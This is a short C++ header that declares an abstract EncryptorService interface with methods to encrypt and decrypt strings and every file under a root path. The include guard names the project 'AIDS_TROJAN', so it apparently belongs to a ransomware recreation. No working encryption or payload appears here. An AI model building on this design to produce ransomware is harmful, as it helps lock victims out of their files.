#ifndef AIDS_TROJAN_ENCRYPTORSERVICE_H
#define AIDS_TROJAN_ENCRYPTORSERVICE_H

#include "FolderService.h"

class EncryptorService {
protected:
    FolderService folderService;

public:

    EncryptorService() {}

    virtual std::string encrypt(std::string message) = 0;

    virtual void encryptFilesIn(std::filesystem::path rootPath) = 0;

    virtual std::string decrypt(std::string ciphertext) = 0;

    virtual void decryptFilesIn(std::filesystem::path rootPath) = 0;

    virtual std::filesystem::path getRootPath() const = 0;

    virtual ~EncryptorService() {}
};
#endif //AIDS_TROJAN_ENCRYPTORSERVICE_H
